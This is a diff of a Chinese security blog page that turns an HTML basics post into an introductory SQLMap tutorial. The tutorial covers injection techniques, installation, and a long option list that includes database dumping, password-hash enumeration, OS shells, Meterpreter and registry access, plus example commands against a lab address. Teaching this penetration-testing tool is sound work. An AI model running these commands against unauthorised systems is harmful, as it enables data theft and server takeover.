@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="WEB安全HTML基础, Cx330 计算机 网络安全 渗透测试">
+    <meta name="keywords" content="SQLMap入门, Cx330 计算机 网络安全 渗透测试">
     <meta name="description" content="专科 | 电子信息工程 | 网络安全">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>WEB安全HTML基础 | Cx330</title>
+    <title>SQLMap入门 | Cx330</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -355,12 +355,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://s1.ax1x.com/2022/08/13/vtnVTf.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://s1.ax1x.com/2022/08/15/vdkhYF.png')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">WEB安全HTML基础</h1>
+                    <h1 class="description center-align post-title">SQLMap入门</h1>
                 </div>
             </div>
         </div>
@@ -479,12 +479,16 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/HTML/">
-                                <span class="chip bg-color">HTML</span>
-                            </a>
-                        
                             <a href="/tags/Web-Security/">
                                 <span class="chip bg-color">Web Security</span>
+                            </a>
+                        
+                            <a href="/tags/tools/">
+                                <span class="chip bg-color">tools</span>
+                            </a>
+                        
+                            <a href="/tags/SQLMap/">
+                                <span class="chip bg-color">SQLMap</span>
                             </a>
                         
                     </div>
@@ -495,8 +499,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/HTML/" class="post-category">
-                                HTML
+                            <a href="/categories/SQLMap/" class="post-category">
+                                SQLMap
                             </a>
                         
                     </div>
@@ -508,28 +512,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2022-08-08
+                    2022-08-15
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2022-08-13
+                    2022-08-15
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.2k
+                    4.1k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    5 分
+                    16 分
                 </div>
                 
 
@@ -549,178 +553,333 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h3 id="0x001-HTML简介"><a href="#0x001-HTML简介" class="headerlink" title="0x001 HTML简介"></a>0x001 HTML简介</h3><hr>
-<p>什么是HTML?</p>
+                <h3 id="0x001-SQLMap-详解"><a href="#0x001-SQLMap-详解" class="headerlink" title="0x001 SQLMap 详解"></a>0x001 SQLMap 详解</h3><hr>
+<p>SQLMap 是一个自动化的SQL注入工具，其主要功能是扫描、发现并利用给定URL的SQL注入漏洞，内置很多绕过插件，支持的数据库是MySQl、Oracle、PostgreSQL、Microsoft SQL Server、Microsoft Access、IBM DB2、SQLite、Firebird、Sybase和SAP MaxDB。SQLMap采用了一下5种SQL注入技术：</p>
 <ul>
-<li><code>HTML</code> 是用来描述网页的一种语言。</li>
-<li><code>HTML</code> 指的是超文本标记语言: <code>HyperText Markup Language</code></li>
-<li><code>HTML</code> 不是一种编程语言，而是一种标记语言</li>
-<li>标记语言是一套标记标签 (<code>markup tag</code>)</li>
-<li><code>HTML</code> 使用标记标签来描述网页</li>
-<li><code>HTML</code> 文档包含了<code>HTML</code> 标签及文本内容</li>
-<li><code>HTML</code>文档也叫做 <code>web</code> 页面</li>
+<li>基于布尔型的盲注，即可以根据返回页面判断条件真假的注入。</li>
+<li>基于时间的盲注，即可以根据页面返回的时间长短判断条件真假的注入。</li>
+<li>基于报错的注入，即页面会返回错误信息，或者把注入的语句直接输出到页面。</li>
+<li>联合查询注入，在可以使用 union 的情况下使用</li>
+<li>堆叠查询注入，可以同时执行多条语句的注入</li>
 </ul>
+<p>SQLMap 的强大功能包括数据库指纹识别、数据库枚举、数据提取、访问目标文件系统、并在获取完全的操作权限是实行任意命令。</p>
 <hr>
-<h3 id="0x002-HTML页面架构"><a href="#0x002-HTML页面架构" class="headerlink" title="0x002 HTML页面架构"></a>0x002 HTML页面架构</h3><hr>
-<pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span><span class="token operator">!</span>DOCTYPE html<span class="token operator">></span>
-<span class="token operator">&lt;</span>html<span class="token operator">></span>
-    <span class="token operator">&lt;</span>head<span class="token operator">></span>
-        <span class="token operator">&lt;</span>meta charset<span class="token operator">=</span><span class="token string">"UTF-8"</span><span class="token operator">></span>
-        <span class="token operator">&lt;</span>title<span class="token operator">></span><span class="token operator">&lt;</span>/title<span class="token operator">></span>
-    <span class="token operator">&lt;</span>/head<span class="token operator">></span>
-    <span class="token operator">&lt;</span>body<span class="token operator">></span>
-    <span class="token operator">&lt;</span>/body<span class="token operator">></span>
-<span class="token operator">&lt;</span>/html<span class="token operator">></span>
-</code></pre>
-<p><code>charset</code>常用编码：<code>gbk</code>、<code>gbk2312</code>、<code>utf-8</code></p>
-<hr>
-<h3 id="0x003-HTML常见标签"><a href="#0x003-HTML常见标签" class="headerlink" title="0x003 HTML常见标签"></a>0x003 HTML常见标签</h3><hr>
-<h4 id="1-meta标签"><a href="#1-meta标签" class="headerlink" title="1.meta标签"></a>1.meta标签</h4><p><code>&lt;meta&gt;</code> 元素可提供有关页面的元信息（<code>meta-information</code>），比如针对搜索引擎和更新频度的描述和关键词。<br>设置网站关键字</p>
-<pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>meta name<span class="token operator">=</span><span class="token string">"keywords"</span> content<span class="token operator">=</span><span class="token string">"网络安全，WEB 渗透"</span>/<span class="token operator">></span>
-</code></pre>
-<p><code>&lt;link&gt;</code> 标签定义文档与外部资源的关系。<br><code>&lt;script&gt;</code> 引入 <code>js</code> 文件</p>
-<p>注释</p>
-<pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span><span class="token operator">!</span>--这是一段注释。注释不会在浏览器中显示。--<span class="token operator">></span>
-<span class="token operator">&lt;</span>p<span class="token operator">></span>这是一段普通的段落。<span class="token operator">&lt;</span>/p<span class="token operator">></span>
-</code></pre>
-<h4 id="2-标题标签"><a href="#2-标题标签" class="headerlink" title="2.标题标签"></a>2.标题标签</h4><p>由大到小</p>
-<pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>h1<span class="token operator">></span>h1<span class="token operator">&lt;</span>/h1<span class="token operator">></span>
-<span class="token operator">&lt;</span>h2<span class="token operator">></span>h2<span class="token operator">&lt;</span>/h2<span class="token operator">></span>
-<span class="token operator">&lt;</span>h3<span class="token operator">></span>h3<span class="token operator">&lt;</span>/h3<span class="token operator">></span>
-<span class="token operator">&lt;</span>h4<span class="token operator">></span>h4<span class="token operator">&lt;</span>/h4<span class="token operator">></span>
-<span class="token operator">&lt;</span>h5<span class="token operator">></span>h5<span class="token operator">&lt;</span>/h5<span class="token operator">></span>
-<span class="token operator">&lt;</span>h6<span class="token operator">></span>h6<span class="token operator">&lt;</span>/h6<span class="token operator">></span>
-</code></pre>
-<pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>/br<span class="token operator">></span> 换行标签
-<span class="token operator">&lt;</span>hr<span class="token operator">></span> 换行线标签
-</code></pre>
-<h4 id="3-文本属性"><a href="#3-文本属性" class="headerlink" title="3.文本属性"></a>3.文本属性</h4><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>strong<span class="token operator">></span>加粗<span class="token operator">&lt;</span>/strong<span class="token operator">></span>
-<span class="token operator">&lt;</span>b<span class="token operator">></span><span class="token operator">&lt;</span>/b<span class="token operator">></span> 加粗
-<span class="token operator">&lt;</span>i<span class="token operator">></span><span class="token operator">&lt;</span>/i<span class="token operator">></span> 斜体
-<span class="token operator">&lt;</span>u<span class="token operator">></span><span class="token operator">&lt;</span>/u<span class="token operator">></span> 下划线
-<span class="token operator">&lt;</span>sup<span class="token operator">></span><span class="token operator">&lt;</span>/sup<span class="token operator">></span> 上标
-<span class="token operator">&lt;</span>sub<span class="token operator">></span><span class="token operator">&lt;</span>/sub<span class="token operator">></span> 下标
-<span class="token operator">&lt;</span>del<span class="token operator">></span><span class="token operator">&lt;</span>/del<span class="token operator">></span> 删除线
-<span class="token operator">&lt;</span>pre<span class="token operator">></span><span class="token operator">&lt;</span>/pre<span class="token operator">></span> 代码样式原样输出
-<span class="token operator">&lt;</span>font<span class="token operator">></span><span class="token operator">&lt;</span>/font<span class="token operator">></span> 规定字体属性
-size 字体的大小
-color 字体颜色
-</code></pre>
-<h4 id="4-form表单"><a href="#4-form表单" class="headerlink" title="4.form表单"></a>4.form表单</h4><p><code>form</code> 表单：规定当提交表单时向何处发送表单数据</p>
-<p><code>method</code> 提交的方法有：<code>get</code>、<code>post</code></p>
-<p>规定在发送表单数据之前对其进行编码。</p>
-<p><code>enctype</code> 属性可能的值：</p>
-<pre class=" language-bash"><code class="language-bash">application/x-www-form-urlencoded
-multipart/form-data
-text/plain
-</code></pre>
-<p><code>input</code>标签</p>
+<h3 id="0x002-SQLMap-入门"><a href="#0x002-SQLMap-入门" class="headerlink" title="0x002 SQLMap 入门"></a>0x002 SQLMap 入门</h3><hr>
+<h4 id="1-安装-SQLMap"><a href="#1-安装-SQLMap" class="headerlink" title="1. 安装 SQLMap"></a>1. 安装 SQLMap</h4><p>SQLMap 的运行需要 python 环境（不支持 python3 ），所以需要先安装 python 环境，安装 python 之后将 python 的安装路径添加至环境变量即可。</p>
+<p>Windows：在<a target="_blank" rel="noopener" href="https://sqlmap.org/">SQLMap官网</a>下载安装即可；然后打开 cmd ，输入 <code>python sqlmap.py</code> 命令后工具即可正常运行。</p>
+<p>Linux：<code>git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap</code></p>
+<h4 id="2-SQLMap-参数"><a href="#2-SQLMap-参数" class="headerlink" title="2. SQLMap 参数"></a>2. SQLMap 参数</h4><p><strong>选项：</strong></p>
 <ul>
-<li>name：同样是表示的该文本输入框名称。</li>
-<li>size：输入框的长度大小。</li>
-<li>maxlength：输入框中允许输入字符的最大数。</li>
-<li>value：输入框中的默认值</li>
-<li>readonly：表示该框中只能显示，不能添加修改。</li>
+<li>-h, –help 显示基本帮助信息并退出</li>
+<li>-hh 显示高级帮助信息并退出</li>
+<li>–version 显示程序版本信息并退出</li>
+<li>-v VERBOSE 输出信息详细程度级别：0-6（默认为 1）</li>
 </ul>
-<p><code>input</code>类型</p>
+<p><strong>目标：</strong></p>
+<p>至少提供一个以下选项以指定目标</p>
 <ul>
-<li>type=password 密码输入框</li>
-<li>type=file 文件上传</li>
-<li>type=hidden 隐藏域</li>
-<li>button 按钮</li>
-<li>checkbox 复选框</li>
-<li>radio 单选框</li>
-<li>type=submit 提交按钮</li>
-<li>type=reset 重置按钮</li>
+<li>-d DIRECT 直接连接数据库</li>
+<li>-u URL, –url=URL 目标 URL（例如：”<a target="_blank" rel="noopener" href="http://www.site.com/vuln.php?id=1&quot;%EF%BC%89">http://www.site.com/vuln.php?id=1"）</a></li>
+<li>-l LOGFILE 从 Burp 或 WebScarab 代理的日志文件中解析目标地址</li>
+<li>-x SITEMAPURL 从远程网站地图（.xml）文件中解析目标</li>
+<li>-m BULKFILE 从文本文件中获取批量目标</li>
+<li>-r REQUESTFILE 从文件中读取 HTTP 请求</li>
+<li>-g GOOGLEDORK 使用 Google dork 结果作为目标</li>
+<li>-c CONFIGFILE 从 INI 配置文件中加载选项</li>
 </ul>
-<h4 id="5-a-标签、img-标签、table-标签"><a href="#5-a-标签、img-标签、table-标签" class="headerlink" title="5.a 标签、img 标签、table 标签"></a>5.a 标签、img 标签、table 标签</h4><p>a 标签的作用：就是用于控制界面与页面之间的跳转，默认就是 self</p>
+<p><strong>请求：</strong></p>
+<p>以下选项可以指定连接目标地址的方式</p>
 <ul>
-<li>self：用于在当前选项卡中跳转，也就是不新建页面跳转</li>
-<li>_blank ：用于在新的选项卡中跳转，也就是新建页面跳转</li>
+<li>–method=METHOD 强制使用提供的 HTTP 方法（例如：PUT）</li>
+<li>–data=DATA 使用 POST 发送数据串</li>
+<li>–param-del=PARA.. 设置参数值分隔符</li>
+<li>–cookie=COOKIE 指定 HTTP Cookie</li>
+<li>–cookie-del=COO.. 设置 cookie 分隔符</li>
+<li>–load-cookies=L.. 指定以 Netscape/wget 格式存放 cookies 的文件</li>
+<li>–drop-set-cookie 忽略 HTTP 响应中的 Set-Cookie 参数</li>
+<li>–user-agent=AGENT 指定 HTTP User-Agent</li>
+<li>–random-agent 使用随机的 HTTP User-Agent</li>
+<li>–host=HOST 指定 HTTP Host</li>
+<li>–referer=REFERER 指定 HTTP Referer</li>
+<li>-H HEADER, –hea.. 设置额外的 HTTP 头参数（例如：”X-Forwarded-For: 127.0.0.1”）</li>
+<li>–headers=HEADERS 设置额外的 HTTP 头参数（例如：”Accept-Language: fr\nETag: 123”）</li>
+<li>–auth-type=AUTH.. HTTP 认证方式（Basic，Digest，NTLM 或 PKI）</li>
+<li>–auth-cred=AUTH.. HTTP 认证凭证（username:password）</li>
+<li>–auth-file=AUTH.. HTTP 认证 PEM 证书/私钥文件</li>
+<li>–ignore-code=IG.. 忽略 HTTP 错误码（例如：401）</li>
+<li>–ignore-proxy 忽略系统默认代理设置</li>
+<li>–ignore-redirects 忽略重定向尝试</li>
+<li>–ignore-timeouts 忽略连接超时</li>
+<li>–proxy=PROXY 使用代理连接目标 URL</li>
+<li>–proxy-cred=PRO.. 使用代理进行认证（username:password）</li>
+<li>–proxy-file=PRO.. 从文件中加载代理列表</li>
+<li>–tor 使用 Tor 匿名网络</li>
+<li>–tor-port=TORPORT 设置 Tor 代理端口代替默认端口</li>
+<li>–tor-type=TORTYPE 设置 Tor 代理方式（HTTP，SOCKS4 或 SOCKS5（默认））</li>
+<li>–check-tor 检查是否正确使用了 Tor</li>
+<li>–delay=DELAY 设置每个 HTTP 请求的延迟秒数</li>
+<li>–timeout=TIMEOUT 设置连接响应的有效秒数（默认为 30）</li>
+<li>–retries=RETRIES 连接超时时重试次数（默认为 3）</li>
+<li>–randomize=RPARAM 随机更改给定的参数值</li>
+<li>–safe-url=SAFEURL 测试过程中可频繁访问且合法的 URL 地址（译者注：有些网站在你连续多次访问错误地址时会关闭会话连接，后面的“请求”小节有详细说明）</li>
+<li>–safe-post=SAFE.. 使用 POST 方法发送合法的数据</li>
+<li>–safe-req=SAFER.. 从文件中加载合法的 HTTP 请求</li>
+<li>–safe-freq=SAFE.. 每访问两次给定的合法 URL 才发送一次测试请求</li>
+<li>–skip-urlencode 不对 payload 数据进行 URL 编码</li>
+<li>–csrf-token=CSR.. 设置网站用来反 CSRF 攻击的 token</li>
+<li>–csrf-url=CSRFURL 指定可提取反 CSRF 攻击 token 的 URL</li>
+<li>–force-ssl 强制使用 SSL/HTTPS</li>
+<li>–hpp 使用 HTTP 参数污染攻击</li>
+<li>–eval=EVALCODE 在发起请求前执行给定的 Python 代码（例如：”import hashlib;id2=hashlib.md5(id).hexdigest()”）</li>
 </ul>
-<pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>a href<span class="token operator">=</span><span class="token string">"http://www.baidu.com"</span> target<span class="token operator">=</span><span class="token string">"self"</span><span class="token operator">></span>百度<span class="token operator">&lt;</span>/a<span class="token operator">></span>
-<span class="token operator">&lt;</span>a href<span class="token operator">=</span><span class="token string">"http://www.baidu.com"</span> target<span class="token operator">=</span><span class="token string">"_blank"</span><span class="token operator">></span>百度<span class="token operator">&lt;</span>/a<span class="token operator">></span>
-</code></pre>
+<p><strong>优化：</strong></p>
+<p>以下选项用于优化 sqlmap 性能</p>
 <ul>
-<li>_blank 在新窗口中打开被链接文档。</li>
-<li>_self 默认。在相同的框架中打开被链接文档。</li>
-<li>_parent 在父框架集中打开被链接文档。</li>
-<li>_top 在整个窗口中打开被链接文档。</li>
+<li>-o 开启所有优化开关</li>
+<li>–predict-output 预测常用请求的输出</li>
+<li>–keep-alive 使用持久的 HTTP(S) 连接</li>
+<li>–null-connection 仅获取页面大小而非实际的 HTTP 响应</li>
+<li>–threads=THREADS 设置 HTTP(S) 请求并发数最大值（默认为 1）</li>
 </ul>
-<h4 id="6-锚文本"><a href="#6-锚文本" class="headerlink" title="6.锚文本"></a>6.锚文本</h4><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>a href<span class="token operator">=</span><span class="token string">"#2"</span><span class="token operator">></span>锚点<span class="token operator">&lt;</span>/a<span class="token operator">></span>
-<span class="token operator">&lt;</span>a name<span class="token operator">=</span><span class="token string">"2"</span><span class="token operator">></span>锚点<span class="token operator">&lt;</span>/a<span class="token operator">></span>
-</code></pre>
-<h4 id="7-img-标签"><a href="#7-img-标签" class="headerlink" title="7.img 标签"></a>7.img 标签</h4><ul>
-<li>img 元素向网页中嵌入一幅图像。</li>
-</ul>
-<pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">"/image/cat.jpg"</span> alt<span class="token operator">=</span><span class="token string">"俺是猫"</span> /<span class="token operator">></span>
-</code></pre>
+<p><strong>注入：</strong></p>
+<p>以下选项用于指定要测试的参数，提供自定义注入 payloads 和篡改参数的脚本</p>
 <ul>
-<li>alt 规定图像的替代文本。</li>
-<li>src 规定显示图像的 url</li>
-<li>width 规定图片的高度</li>
-<li>height 规定图片的宽度</li>
+<li>-p TESTPARAMETER 指定需要测试的参数</li>
+<li>–skip=SKIP 指定要跳过的参数</li>
+<li>–skip-static 指定跳过非动态参数</li>
+<li>–param-exclude=.. 用正则表达式排除参数（例如：”ses”）</li>
+<li>–dbms=DBMS 指定 DBMS 类型（例如：MySQL）</li>
+<li>–dbms-cred=DBMS.. DBMS 认证凭据（username:password）</li>
+<li>–os=OS 指定 DBMS 服务器的操作系统类型</li>
+<li>–invalid-bignum 将无效值设置为大数</li>
+<li>–invalid-logical 对无效值使用逻辑运算</li>
+<li>–invalid-string 对无效值使用随机字符串</li>
+<li>–no-cast 关闭 payload 构造机制</li>
+<li>–no-escape 关闭字符串转义机制</li>
+<li>–prefix=PREFIX 注入 payload 的前缀字符串</li>
+<li>–suffix=SUFFIX 注入 payload 的后缀字符串</li>
+<li>–tamper=TAMPER 用给定脚本修改注入数据</li>
 </ul>
-<h4 id="8-table-表单"><a href="#8-table-表单" class="headerlink" title="8.table 表单"></a>8.table 表单</h4><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>caption<span class="token operator">></span>我的标题<span class="token operator">&lt;</span>/caption<span class="token operator">></span>表格带标题
-</code></pre>
+<p><strong>检测：</strong></p>
+<p>以下选项用于自定义检测方式</p>
 <ul>
-<li>border 边框</li>
-<li>width 宽度</li>
-<li>height 高度</li>
-<li>colspan 行</li>
-<li>rowspan 竖</li>
+<li>–level=LEVEL 设置测试等级（1-5，默认为 1）</li>
+<li>–risk=RISK 设置测试风险等级（1-3，默认为 1）</li>
+<li>–string=STRING 用于确定查询结果为真时的字符串</li>
+<li>–not-string=NOT.. 用于确定查询结果为假时的字符串</li>
+<li>–regexp=REGEXP 用于确定查询结果为真时的正则表达式</li>
+<li>–code=CODE 用于确定查询结果为真时的 HTTP 状态码</li>
+<li>–text-only 只根据页面文本内容对比页面</li>
+<li>–titles 只根据页面标题对比页面</li>
 </ul>
-<pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>th<span class="token operator">></span><span class="token operator">&lt;</span>/th<span class="token operator">></span>
-<span class="token operator">&lt;</span>tr<span class="token operator">></span>行<span class="token operator">&lt;</span>/tr<span class="token operator">></span>
-<span class="token operator">&lt;</span>td<span class="token operator">></span>表格<span class="token operator">&lt;</span>/td<span class="token operator">></span>
-</code></pre>
+<p><strong>技术：</strong><br>以下选项用于调整特定 SQL 注入技术的测试方法</p>
 <ul>
-<li>cellpadding 单元边与内容的空白</li>
-<li>cellspacing 单元格的空白</li>
+<li>–technique=TECH 使用的 SQL 注入技术（默认为“BEUSTQ”）</li>
+<li>B: Boolean-based blind SQL injection（布尔型盲注）</li>
+<li>E: Error-based SQL injection（报错型注入）</li>
+<li>U: UNION query SQL injection（联合查询注入）</li>
+<li>S: Stacked queries SQL injection（堆查询注入）</li>
+<li>T: Time-based blind SQL injection（时间型盲注）</li>
+<li>Q: inline Query injection（内联查询注入）</li>
+<li>–time-sec=TIMESEC 延迟 DBMS 的响应秒数（默认为 5）</li>
+<li>–union-cols=UCOLS 设置联合查询注入测试的列数目范围</li>
+<li>–union-char=UCHAR 用于暴力猜解列数的字符</li>
+<li>–union-from=UFROM 设置联合查询注入 FROM 处用到的表</li>
+<li>–dns-domain=DNS.. 设置用于 DNS 渗出攻击的域名（译者注：推荐阅读《在SQL注入中使用DNS获取数据》<a target="_blank" rel="noopener" href="http://cb.drops.wiki/drops/tips-5283.html%EF%BC%8C%E5%9C%A8%E5%90%8E%E9%9D%A2%E7%9A%84%E2%80%9C%E6%8A%80%E6%9C%AF%E2%80%9D%E5%B0%8F%E8%8A%82%E4%B8%AD%E4%B9%9F%E6%9C%89%E7%9B%B8%E5%BA%94%E8%A7%A3%E9%87%8A%EF%BC%89">http://cb.drops.wiki/drops/tips-5283.html，在后面的“技术”小节中也有相应解释）</a></li>
+<li>–second-order=S.. 设置二阶响应的结果显示页面的 URL（译者注：该选项用于二阶 SQL 注入）</li>
 </ul>
-<h4 id="9-列表标签"><a href="#9-列表标签" class="headerlink" title="9.列表标签"></a>9.列表标签</h4><p><strong>无序列表</strong><br>项目符号 <code>square</code> <code>circle</code> <code>disc</code></p>
-<pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>ul<span class="token operator">></span>
-    <span class="token operator">&lt;</span>li<span class="token operator">></span><span class="token operator">&lt;</span>/li<span class="token operator">></span>
-    <span class="token operator">&lt;</span>li<span class="token operator">></span><span class="token operator">&lt;</span>/li<span class="token operator">></span>
-    <span class="token operator">&lt;</span>li<span class="token operator">></span><span class="token operator">&lt;</span>/li<span class="token operator">></span>
-    <span class="token operator">&lt;</span>li<span class="token operator">></span><span class="token operator">&lt;</span>/li<span class="token operator">></span>
-<span class="token operator">&lt;</span>/ul<span class="token operator">></span>
-</code></pre>
-<p><strong>有序列表</strong></p>
+<p><strong>指纹识别：</strong></p>
 <ul>
-<li>数字列表 默认 数字</li>
-<li>小写字母列表</li>
-<li>大写字母列表 A</li>
-<li>罗马字母列表 I</li>
-<li>小写罗马字母列表 i</li>
+<li>-f, –fingerprint 执行广泛的 DBMS 版本指纹识别</li>
 </ul>
-<pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>ol type<span class="token operator">=</span><span class="token string">"1"</span><span class="token operator">></span> <span class="token operator">&lt;</span><span class="token operator">!</span>--有序列表--<span class="token operator">></span>
-    <span class="token operator">&lt;</span>li<span class="token operator">></span><span class="token operator">&lt;</span>/li<span class="token operator">></span>
-    <span class="token operator">&lt;</span>li<span class="token operator">></span><span class="token operator">&lt;</span>/li<span class="token operator">></span>
-    <span class="token operator">&lt;</span>li<span class="token operator">></span><span class="token operator">&lt;</span>/li<span class="token operator">></span>
-<span class="token operator">&lt;</span>/ol<span class="token operator">></span>
+<p><strong>枚举：</strong></p>
+<p>以下选项用于获取后端数据库管理系统的信息，结构和数据表中的数据。此外，还可以运行你输入的 SQL 语句</p>
+<ul>
+<li>-a, –all 获取所有信息、数据</li>
+<li>-b, –banner 获取 DBMS banner</li>
+<li>–current-user 获取 DBMS 当前用户</li>
+<li>–current-db 获取 DBMS 当前数据库</li>
+<li>–hostname 获取 DBMS 服务器的主机名</li>
+<li>–is-dba 探测 DBMS 当前用户是否为 DBA（数据库管理员）</li>
+<li>–users 枚举出 DBMS 所有用户</li>
+<li>–passwords 枚举出 DBMS 所有用户的密码哈希</li>
+<li>–privileges 枚举出 DBMS 所有用户特权级</li>
+<li>–roles 枚举出 DBMS 所有用户角色</li>
+<li>–dbs 枚举出 DBMS 所有数据库</li>
+<li>–tables 枚举出 DBMS 数据库中的所有表</li>
+<li>–columns 枚举出 DBMS 表中的所有列</li>
+<li>–schema 枚举出 DBMS 所有模式</li>
+<li>–count 获取数据表数目</li>
+<li>–dump 导出 DBMS 数据库表项</li>
+<li>–dump-all 导出所有 DBMS 数据库表项</li>
+<li>–search 搜索列，表和/或数据库名</li>
+<li>–comments 获取 DBMS 注释</li>
+<li>-D DB 指定要枚举的 DBMS 数据库</li>
+<li>-T TBL 指定要枚举的 DBMS 数据表</li>
+<li>-C COL 指定要枚举的 DBMS 数据列</li>
+<li>-X EXCLUDECOL 指定要排除的 DBMS 数据列</li>
+<li>-U USER 指定枚举的 DBMS 用户</li>
+<li>–exclude-sysdbs 枚举所有数据表时，指定排除特定系统数据库</li>
+<li>–pivot-column=P.. 指定主列</li>
+<li>–where=DUMPWHERE 在转储表时使用 WHERE 条件语句</li>
+<li>–start=LIMITSTART 指定要导出的数据表条目开始行数</li>
+<li>–stop=LIMITSTOP 指定要导出的数据表条目结束行数</li>
+<li>–first=FIRSTCHAR 指定获取返回查询结果的开始字符位</li>
+<li>–last=LASTCHAR 指定获取返回查询结果的结束字符位</li>
+<li>–sql-query=QUERY 指定要执行的 SQL 语句</li>
+<li>–sql-shell 调出交互式 SQL shell</li>
+<li>–sql-file=SQLFILE 执行文件中的 SQL 语句</li>
+</ul>
+<p><strong>暴力破解：</strong></p>
+<ul>
+<li>–common-tables 检测常见的表名是否存在</li>
+<li>–common-columns 检测常用的列名是否存在</li>
+</ul>
+<p><strong>用户自定义函数注入：</strong></p>
+<ul>
+<li>–udf-inject 注入用户自定义函数</li>
+<li>–shared-lib=SHLIB 共享库的本地路径</li>
+</ul>
+<p><strong>访问文件系统：</strong></p>
+<p>以下选项用于访问后端数据库管理系统的底层文件系统</p>
+<ul>
+<li>–file-read=RFILE 读取后端 DBMS 文件系统中的文件</li>
+<li>–file-write=WFILE 写入后端 DBMS 文件系统中的文件</li>
+<li>–file-dest=DFILE 使用文件绝对路径写入到后端 DBMS</li>
+</ul>
+<p><strong>访问操作系统：</strong></p>
+<p>以下选项用于访问后端数据库管理系统的底层操作系统</p>
+<ul>
+<li>–os-cmd=OSCMD 执行操作系统命令</li>
+<li>–os-shell 调出交互式操作系统 shell</li>
+<li>–os-pwn 调出 OOB shell，Meterpreter 或 VNC</li>
+</ul>
+<p><strong>常见命令</strong></p>
+<p>sqlmap -u <a target="_blank" rel="noopener" href="http://sqlmap.com/index.php?id=1">http://sqlmap.com/index.php?id=1</a> -v 1<br>sqlmap -u “<a target="_blank" rel="noopener" href="http://192.168.0.103/06/vul/sqli/sqli_str.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2&quot;">http://192.168.0.103/06/vul/sqli/sqli_str.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2"</a> -v 1</p>
+<ul>
+<li>-u 和–url参数一样 都是代表填写测试的url连接 如果存在&amp;符号需要添加把url放在双引号内</li>
+<li>-v 表示 输出信息详细程度级别：0-6（默认为 1）级别越高，信息就越详细，根据需求选择合适的输出信息。</li>
+<li>–os-smbrelay 一键调出 OOB shell，Meterpreter 或 VNC</li>
+<li>–os-bof 利用存储过程的缓冲区溢出</li>
+<li>–priv-esc 数据库进程用户提权</li>
+<li>–msf-path=MSFPATH Metasploit 框架的本地安装路径</li>
+<li>–tmp-path=TMPPATH 远程临时文件目录的绝对路径</li>
+</ul>
+<p><strong>访问 Windows 注册表：</strong></p>
+<p>以下选项用于访问后端数据库管理系统的 Windows 注册表</p>
+<ul>
+<li>–reg-read 读取一个 Windows 注册表键值</li>
+<li>–reg-add 写入一个 Windows 注册表键值数据</li>
+<li>–reg-del 删除一个 Windows 注册表键值</li>
+<li>–reg-key=REGKEY 指定 Windows 注册表键</li>
+<li>–reg-value=REGVAL 指定 Windows 注册表键值</li>
+<li>–reg-data=REGDATA 指定 Windows 注册表键值数据</li>
+<li>–reg-type=REGTYPE 指定 Windows 注册表键值类型</li>
+</ul>
+<p><strong>通用选项：</strong></p>
+<p>以下选项用于设置通用的参数</p>
+<ul>
+<li>-s SESSIONFILE 从文件（.sqlite）中读入会话信息</li>
+<li>-t TRAFFICFILE 保存所有 HTTP 流量记录到指定文本文件</li>
+<li>–batch 从不询问用户输入，使用默认配置</li>
+<li>–binary-fields=.. 具有二进制值的结果字段（例如：”digest”）</li>
+<li>–check-internet 在访问目标之前检查是否正常连接互联网</li>
+<li>–crawl=CRAWLDEPTH 从目标 URL 开始爬取网站</li>
+<li>–crawl-exclude=.. 用正则表达式筛选爬取的页面（例如：”logout”）</li>
+<li>–csv-del=CSVDEL 指定输出到 CVS 文件时使用的分隔符（默认为“,”）</li>
+<li>–charset=CHARSET 指定 SQL 盲注字符集（例如：”0123456789abcdef”）</li>
+<li>–dump-format=DU.. 导出数据的格式（CSV（默认），HTML 或 SQLITE）</li>
+<li>–encoding=ENCOD.. 指定获取数据时使用的字符编码（例如：GBK）</li>
+<li>–eta 显示每个结果输出的预计到达时间</li>
+<li>–flush-session 清空当前目标的会话文件</li>
+<li>–forms 解析并测试目标 URL 的表单</li>
+<li>–fresh-queries 忽略存储在会话文件中的查询结果</li>
+<li>–har=HARFILE 将所有 HTTP 流量记录到一个 HAR 文件中</li>
